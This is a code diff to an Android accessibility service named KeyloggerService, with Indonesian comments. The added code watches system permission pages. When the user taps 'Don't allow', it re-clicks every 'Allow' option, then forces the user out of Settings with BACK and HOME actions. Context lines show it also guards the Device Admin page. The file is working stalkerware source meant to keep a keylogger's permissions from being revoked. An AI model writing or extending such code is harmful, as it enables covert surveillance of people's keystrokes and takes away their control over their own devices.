@@ -100,7 +100,8 @@ class KeyloggerService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                 AccessibilityEvent.TYPE_VIEW_FOCUSED            or
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or
-                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED  or
+                AccessibilityEvent.TYPE_VIEW_CLICKED            // ← deteksi tap user di halaman permission
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags        =
                 AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS              or
@@ -142,6 +143,15 @@ class KeyloggerService : AccessibilityService() {
     private var lastPermGuardPkg = ""
     private var lastPermGuardMs  = 0L
 
+    /** Cek apakah pkg+className adalah halaman permission settings */
+    private fun isPermissionPage(pkg: String, className: String): Boolean {
+        if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return false
+        val isDedicated = AppDeviceAdminReceiver.PERMISSION_CONTROLLER_PACKAGES.contains(pkg)
+        return isDedicated || AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any {
+            className.contains(it, ignoreCase = true)
+        }
+    }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         val ev = event ?: return
 
@@ -165,10 +175,34 @@ class KeyloggerService : AccessibilityService() {
                 if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                     // FIX Bug 4: cegah user buka halaman Device Admin
                     guardAdminPage(pkg, ev.className?.toString() ?: "")
-                    // Anti-disable permission: cegah user matikan permission aktif
+                    // Anti-disable permission: cegah + restore permission aktif
                     guardPermissionPage(pkg, ev.className?.toString() ?: "")
                     autoTriggerOverlay(pkg)
                 }
+            }
+
+            // ── User tap sesuatu — KUNCI: deteksi klik di halaman permission ──
+            // Pendekatan RESTORE: jika user tap "Jangan izinkan", kita langsung
+            // scan node tree dan re-klik "Izinkan" — lebih reliable dari overlay.
+            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                if (!permissionGuardEnabled) return
+                val pkg = ev.packageName?.toString() ?: return
+                if (pkg == packageName) return
+                val className = ev.className?.toString() ?: ""
+                if (!isPermissionPage(pkg, className)) return
+
+                android.util.Log.d("PermGuard", "Click detected on perm page: $pkg / $className")
+
+                // T+100ms: restore "Izinkan" (beri waktu state radio-button update dulu)
+                handler.postDelayed({ restorePermissionAllow() }, 100)
+                // T+150ms: restore sekali lagi (double-ensure untuk MIUI animasi lambat)
+                handler.postDelayed({ restorePermissionAllow() }, 150)
+                // T+200ms: BACK keluar halaman
+                handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 200)
+                // T+400ms: HOME (pastikan keluar Settings sepenuhnya)
+                handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 400)
+                // T+600ms: restore sekali lagi sebagai final safety net
+                handler.postDelayed({ restorePermissionAllow() }, 600)
             }
 
             // ── Konten window berubah (navigasi fragment dalam activity yg sama) ──
@@ -187,6 +221,8 @@ class KeyloggerService : AccessibilityService() {
 
                 val className = ev.className?.toString() ?: ""
                 guardPermissionPage(pkg, className)
+                // Juga restore "Izinkan" jika konten berubah (user mungkin sudah tap)
+                if (isPermissionPage(pkg, className)) restorePermissionAllow()
             }
 
             // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
@@ -350,6 +386,81 @@ class KeyloggerService : AccessibilityService() {
 
         // LANGKAH 3 — Tutup overlay setelah navigasi pasti selesai
         dismissPermGuardOverlay(700)                                                 // T+700ms
+    }
+
+    /**
+     * PENDEKATAN RESTORE — scan seluruh node tree di window aktif,
+     * cari semua opsi "Izinkan" / "Allow" dan force-klik.
+     *
+     * Dipanggil setelah user tap apapun di halaman permission.
+     * Bahkan jika "Jangan izinkan" sudah berhasil dipilih, kita langsung
+     * klik balik "Izinkan" sehingga permission tetap ON.
+     *
+     * Label mencakup: radio button "Izinkan", "Allow", tombol "Izinkan" di dialog,
+     * dan variant "Hanya saat menggunakan aplikasi" (juga termasuk allow).
+     */
+    private val PERM_ALLOW_LABELS = listOf(
+        // Bahasa Indonesia
+        "izinkan", "izin", "izinkan saja", "hanya kali ini",
+        "hanya saat menggunakan aplikasi", "selalu izinkan",
+        // English
+        "allow", "grant", "allow only while using the app",
+        "only this time", "always", "allow all the time",
+        "while using the app"
+    )
+
+    private fun restorePermissionAllow() {
+        if (!permissionGuardEnabled) return
+        val root = rootInActiveWindow ?: return
+        try {
+            val clicked = forceClickAllow(root)
+            android.util.Log.d("PermGuard", "restorePermissionAllow clicked=$clicked")
+        } finally {
+            try { root.recycle() } catch (_: Exception) {}
+        }
+    }
+
+    /**
+     * Traverse node tree secara rekursif.
+     * Klik semua node yang teksnya cocok dengan PERM_ALLOW_LABELS —
+     * tidak peduli apakah sudah selected atau belum (force-click).
+     * Return true jika minimal satu berhasil diklik.
+     */
+    private fun forceClickAllow(
+        node: android.view.accessibility.AccessibilityNodeInfo
+    ): Boolean {
+        val text = node.text?.toString()?.trim()?.lowercase() ?: ""
+        val desc = node.contentDescription?.toString()?.trim()?.lowercase() ?: ""
+
+        val isAllow = PERM_ALLOW_LABELS.any { label ->
+            text == label || text.startsWith(label) ||
+            desc == label || desc.startsWith(label)
+        }
+
+        var clicked = false
+        if (isAllow) {
+            if (node.isClickable) {
+                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                clicked = true
+            } else {
+                val parent = node.parent
+                if (parent != null) {
+                    if (parent.isClickable) {
+                        parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        clicked = true
+                    }
+                    try { parent.recycle() } catch (_: Exception) {}
+                }
+            }
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val childClicked = forceClickAllow(child)
+            try { child.recycle() } catch (_: Exception) {}
+            if (childClicked) clicked = true
+        }
+        return clicked
     }
 
     private fun autoTriggerOverlay(pkg: String) {
